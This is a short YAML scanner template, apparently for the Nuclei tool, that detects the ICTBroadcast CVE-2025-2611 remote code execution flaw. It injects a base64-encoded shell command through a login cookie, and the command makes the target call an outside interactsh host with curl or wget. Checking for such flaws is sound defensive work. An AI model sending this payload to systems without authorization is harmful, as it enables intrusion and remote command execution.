id: ICTBroadcast-CVE-2025-2611-RCE

info:
  name: ICTBroadcast-CVE-2025-2611-RCE
  author: iSee857
  severity: critical
  description: |
    ICTBroadcast-CVE-2025-2611-RCE

http:
  - id: step1
    method: GET
    path:
      - "{{BaseURL}}/login.php"

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "Set-Cookie:"

    extractors:
      - type: regex
        name: cookie_name
        part: header
        internal: true
        group: 1
        regex:
          - '(?mi)^Set-Cookie:\s*([A-Za-z0-9_-]+)='

  - id: step2
    raw:
      - |
        GET /login.php HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{cookie_name}}={{cookie_payload}}

    payloads:
      cookie_payload:
        - "`echo${IFS}{{base64('curl -s {{interactsh-url}} || wget -qO- {{interactsh-url}}')}}|base64${IFS}-d|sh`"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"